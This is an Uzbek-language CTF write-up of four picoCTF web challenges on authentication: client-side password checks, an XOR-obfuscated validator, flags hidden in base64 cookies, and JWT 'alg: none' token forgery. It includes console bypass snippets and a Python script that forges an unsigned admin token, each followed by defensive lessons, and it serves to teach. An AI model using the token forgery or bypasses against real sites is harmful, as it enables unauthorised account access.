# 🔐 Authentication & Session Challenges

> **Kategoriya:** Web Exploitation — Auth & Sessions  
> **Challenges:** Local Authority · dont-use-client-side · Cookie Monster Secret Recipe · Old Sessions  
> **Daraja:** Beginner → Intermediate  
> **Muallif:** [Ism Familiya]

---

## Umumiy tushuncha

Authentication (autentifikatsiya) — foydalanuvchi kim ekanligini tekshirish jarayoni. Session management — autentifikatsiyadan keyin foydalanuvchi holatini saqlash mexanizmi. Bu sohadagi xatolar OWASP Top 10 ro'yxatida doimo mavjud bo'lib, eng keng tarqalgan zaifliklardan biri hisoblanadi.

---

## 1. Local Authority

### 📋 Challenge tavsifi
Saytda login forma mavjud. Parol tekshiruvi server-side'da emas, balki JavaScript'da — ya'ni foydalanuvchi brauzerida bajariladi. Biz bu logikani o'qib, parolni topamiz yoki bypass qilamiz.

### 🔍 Yechim jarayoni

**1-qadam — Saytni ochamiz:**  
Login forma ko'rinadi. Tasodifiy parol kiritib ko'ramiz — "Wrong password!" xabari chiqadi.

**2-qadam — JS source kodini tekshiramiz:**  
`F12` → Sources → `.js` fayl yoki inline script:

```javascript
function checkPassword() {
    var entered = document.getElementById('password').value;
    if (entered === "supersecretpassword!") {
        document.getElementById('flag').style.display = 'block';
    } else {
        alert("Wrong password!");
    }
}
```

**3-qadam — Parolni to'g'ridan-to'g'ri JS koddan olamiz:**  
```
supersecretpassword!
```

**4-qadam — Parolni formaga kiritamiz va flag ko'rinadi. ✅**

**Alternativ — Console injection:**
```javascript
// F12 → Console → flagni zo'rlik bilan ko'rsatamiz:
document.getElementById('flag').style.display = 'block';
// yoki:
checkPassword.toString() // funksiya ichini ko'ramiz
```

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| `F12` → Sources | JS kodini o'qish |
| `F12` → Console | JS injection |

### 💡 Xulosa va o'rganilgan narsalar
> **Oltin qoida:** Hech qachon authentication logikasini client-side JavaScript'da amalga oshirmang! Foydalanuvchi barcha JS kodini ko'rishi, o'zgartirishi va bypass qilishi mumkin. Parol tekshiruvi faqat server-side (backend) da bajarilishi shart.

**OWASP:** A07:2021 – Identification and Authentication Failures

**Kalit tushunchalar:** Client-side auth bypass, JS source analysis, DOM manipulation

---

## 2. dont-use-client-side

### 📋 Challenge tavsifi
Nom o'ziyoq ogohlantiradi — client-side validation ishlatilgan. Forma yuborilganda, tekshiruv JavaScript'da amalga oshiriladi. Biz tekshiruv logikasini topib, bypass qilishimiz yoki to'g'ri qiymatni chiqarib olishimiz kerak.

### 🔍 Yechim jarayoni

**1-qadam — JS kodini topamiz:**
```javascript
function verify() {
    var answer = document.getElementById('answer').value;
    var splitUp = answer.split("");
    var flag = "";
    for(var i = 0; i < splitUp.length; i++) {
        flag += String.fromCharCode(splitUp[i].charCodeAt(0) ^ 0x12);
    }
    if(flag === "\x7a\x60\x6c\x62\x5d...") {
        alert("Correct!");
    }
}
```

**2-qadam — Logikani teskari ishlaymiz (reverse engineering):**  
XOR operatsiyasi — agar `A XOR key = B`, demak `B XOR key = A`.

```javascript
// Console'da teskari XOR:
var encoded = "\x7a\x60\x6c\x62\x5d...";
var result = "";
for(var i = 0; i < encoded.length; i++) {
    result += String.fromCharCode(encoded.charCodeAt(i) ^ 0x12);
}
console.log(result);
// Natija: picoCTF{...}
```

**3-qadam — Yoki funksiyani bypass qilamiz:**
```javascript
// Console'da:
window.verify = function() { 
    alert("Correct!"); 
    document.getElementById('flag').style.display = 'block';
}
```

**4-qadam — Flag! ✅**

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| `F12` → Sources | JS logikasini o'rganish |
| `F12` → Console | Reverse engineering |

### 💡 Xulosa va o'rganilgan narsalar
> XOR — oddiy matematik operatsiya bo'lib, kalit ma'lum bo'lsa teskari qilish juda oson. Client-side validation — real xavfsizlik emas, faqat ko'rgazma. Har qanday foydalanuvchi DevTools bilan uni bypass qila oladi.

**Kalit tushunchalar:** XOR cipher, reverse engineering, client-side bypass, function override

---

## 3. Cookie Monster Secret Recipe

### 📋 Challenge tavsifi
"Cookie Monster" kabi, flag cookie'larda yashiringan. Browser cookie'lari — sayt foydalanuvchi brauzerida saqlaydigan kichik ma'lumot bo'laklari. Ular DevTools orqali osongina o'qiladi va o'zgartiriladi.

### 🔍 Yechim jarayoni

**1-qadam — Saytga kiramiz.**

**2-qadam — Cookie'larni ochamiz:**
```
F12 → Application tab → Storage → Cookies → sayt domenini tanlaymiz
```

**3-qadam — Cookie qiymatlarini ko'ramiz:**
```
Name            Value
──────────────────────────────────────────────────────
secret_recipe   cGljb0NURntjMDBraWVfbTBuc3Rlcl8xM2Y3NjV9
session         abc123
```

**4-qadam — Base64 encoded qiymatni decode qilamiz:**
```bash
# Terminal:
echo "cGljb0NURntjMDBraWVfbTBuc3Rlcl8xM2Y3NjV9" | base64 -d
# Natija: picoCTF{c00kie_m0nster_13f765}

# Browser Console:
atob("cGljb0NURntjMDBraWVfbTBuc3Rlcl8xM2Y3NjV9")
```

**5-qadam — Flag topildi! ✅**

**Agar flag to'g'ridan-to'g'ri cookie'da bo'lsa:**  
Ba'zan flag encode qilinmagan ham bo'ladi:
```
flag   picoCTF{c00kie_m0nster_...}
```

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| `F12` → Application → Cookies | Cookie'larni ko'rish |
| `base64 -d` | Base64 decode (Linux) |
| `atob()` | Base64 decode (Browser) |

### 💡 Xulosa va o'rganilgan narsalar
> Cookie'lar foydalanuvchi brauzerida ochiq saqlanadi. Ularga quyidagi himoya atributlari qo'shilishi shart:
> - `HttpOnly` — JS bilan o'qib bo'lmaydi
> - `Secure` — faqat HTTPS orqali yuboriladi  
> - `SameSite=Strict` — CSRF hujumlardan himoya
>
> Shunga qaramay, cookie'larda hech qachon maxfiy ma'lumot saqlanmasligi kerak!

**OWASP:** A02:2021 – Cryptographic Failures

**Kalit tushunchalar:** Cookie inspection, Base64 decoding, cookie security attributes

---

## 4. Old Sessions

### 📋 Challenge tavsifi
Eski session tokenlar zaif algoritm bilan yaratilgan. JWT (JSON Web Token) `alg: none` zaifligidan foydalanib, biz o'zimizni admin sifatida ko'rsatuvchi token yasaymiz va flagni olamiz.

### 🔍 Yechim jarayoni

**1-qadam — Session cookie'ni topamiz:**
```
F12 → Application → Cookies
```
```
Name: session
Value: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QifQ.
```

**2-qadam — JWT tuzilishini tushunish:**  
JWT uchta qismdan iborat, nuqta (`.`) bilan ajratilgan:
```
HEADER.PAYLOAD.SIGNATURE
```

**3-qadam — [jwt.io](https://jwt.io) da decode qilamiz:**

```json
// Header:
{
  "alg": "none",
  "typ": "JWT"
}

// Payload:
{
  "user": "guest"
}
```

**`"alg": "none"` — bu kritik zaiflik!** Server signature tekshirmaydi.

**4-qadam — Admin token yasaymiz:**

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"user": "admin"})
token   = f"{header}.{payload}."   # Signature bo'sh!

print(token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**5-qadam — Cookie'ni yangi token bilan almashtiramiz:**
```
F12 → Application → Cookies → session qiymatini yangi token bilan o'zgartiramiz
```

**6-qadam — Sahifani yangilaymiz → Admin paneliga kirdik → Flag! ✅**

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| [jwt.io](https://jwt.io) | JWT decode/encode |
| `F12` → Application | Cookie o'zgartirish |
| Python | Custom JWT yaratish |

### 💡 Xulosa va o'rganilgan narsalar
> **JWT `alg: none`** — klassik va hali ham uchrab turadigan zaiflik. To'g'ri JWT implementatsiyasi:
> - `alg: none` ni hech qachon qabul qilmaslik
> - Kuchli algoritm ishlatish: `HS256` (symmetric) yoki `RS256` (asymmetric)
> - Signature'ni har doim tekshirish

```
Zaif:    alg: none  →  Signature tekshirilmaydi
To'g'ri: alg: HS256 →  Secret key bilan imzolanadi
```

**OWASP:** A07:2021 – Identification and Authentication Failures  
**CVE:** JWT None Algorithm Attack

**Kalit tushunchalar:** JWT structure, alg:none vulnerability, token forgery, privilege escalation

---

## 📊 Umumiy xulosa

| Challenge | Zaiflik | To'g'ri yechim |
|-----------|---------|----------------|
| Local Authority | Client-side auth | Server-side validation |
| dont-use-client-side | JS logic bypass | Backend tekshiruv |
| Cookie Monster | Plaintext/Base64 cookie | Signed, HttpOnly cookies |
| Old Sessions | JWT alg:none | Kuchli JWT imzosi |

### Authentication xavfsizlik tamoyillari
1. **Validation — faqat server-side**
2. **Session tokenlar — cryptographically secure random**
3. **JWT — kuchli algoritm, signature majburiy**
4. **Cookies — HttpOnly + Secure + SameSite**
5. **Parollar — bcrypt/argon2 bilan hashing**

---

*PicoCTF | Web Exploitation | Authentication & Sessions*
